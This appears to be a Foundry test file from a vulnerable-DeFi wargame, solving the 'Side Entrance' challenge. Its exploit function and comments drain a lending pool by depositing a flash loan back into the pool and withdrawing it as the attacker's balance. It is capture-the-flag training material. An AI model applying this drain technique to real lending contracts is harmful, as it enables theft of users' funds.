// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {AttackContract} from "../../../src/Contracts/side-entrance/Attacker.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;
    AttackContract internal attackContract;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // 1. all eth in pool (balance: 1000) need to be drained by attacker
        // 2. the contract provide deposit, withdraw and flashLoan
        // 3. what if attacker(Contract) use flashloan, and deposit the loan to contract in a transaction (through execute)?
        // 4. attacker(Contract) get fake balance of pool contract.
        // 5. attacker(Contract) withdraw from pool contract, then transfer to attacker!
        vm.startPrank(attacker);
        attackContract = new AttackContract(address(sideEntranceLenderPool));
        attackContract.attack(ETHER_IN_POOL);
        attackContract.withdraw();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
